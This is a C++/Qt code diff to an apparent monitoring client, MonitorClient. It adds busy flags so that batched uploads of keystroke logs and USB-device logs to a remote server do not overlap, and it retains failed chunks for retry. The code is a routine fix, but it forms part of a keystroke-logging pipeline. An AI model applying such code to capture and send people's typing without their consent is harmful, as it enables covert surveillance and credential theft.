@@ -1130,6 +1130,8 @@ int MonitorClient::sendKeyLogs()
         return -3;
     }
 
+    if(m_keyUploadBusy)return 0;
+    m_keyUploadBusy=true;
     const int totalEvents = keyLogs.size();
     QList<QList<QJsonObject>> chunks = chunkData(keyLogs, 1000);
     keyLogs.clear();
@@ -1150,6 +1152,8 @@ int MonitorClient::sendUSBLogs()
     if (serverIP.isEmpty() || serverPort <= 0)
         return -3;
 
+    if(m_usbUploadBusy)return 0;
+    m_usbUploadBusy=true;
     QList<QList<QJsonObject>> chunks = chunkData(usbLogs, 500);
     usbLogs.clear();
     qDebug() << "Sending" << chunks.size() << "USB log chunk(s)";
@@ -1237,6 +1241,7 @@ void MonitorClient::continueSendKeyLogs(int index, QList<QList<QJsonObject>> chu
     QString serverIP = getServerIP();
     int serverPort = getServerPort();
     if (index >= chunks.size()) {
+        m_keyUploadBusy=false;
         if (!chunks.isEmpty())
             qInfo() << "[KeyLog] upload batch finished" << chunks.size() << "chunk(s)";
         updateStatusDisplay();
@@ -1261,6 +1266,7 @@ void MonitorClient::continueSendKeyLogs(int index, QList<QList<QJsonObject>> chu
                     pending.append(chunks[batch]);
                 pending.append(keyLogs);
                 keyLogs.swap(pending);
+                m_keyUploadBusy=false;
                 qWarning() << "[KeyLog] chunk" << (index + 1) << "/" << chunks.size()
                            << "HTTP failed (non-200 or network error)," << chunks[index].size()
                            << "events retained for retry";
@@ -1274,6 +1280,7 @@ void MonitorClient::continueSendUsbLogs(int index, QList<QList<QJsonObject>> chu
     QString serverIP = getServerIP();
     int serverPort = getServerPort();
     if (index >= chunks.size()) {
+        m_usbUploadBusy=false;
         updateStatusDisplay();
         return;
     }
@@ -1294,7 +1301,9 @@ void MonitorClient::continueSendUsbLogs(int index, QList<QList<QJsonObject>> chu
                     pending.append(chunks[batch]);
                 pending.append(usbLogs);
                 usbLogs.swap(pending);
-                qDebug() << "USB log chunk failed at" << index;
+                m_usbUploadBusy=false;
+                qWarning() << "USB log upload failed at chunk" << index
+                           << "- pending events retained for retry";
                 updateStatusDisplay();
             }
         });
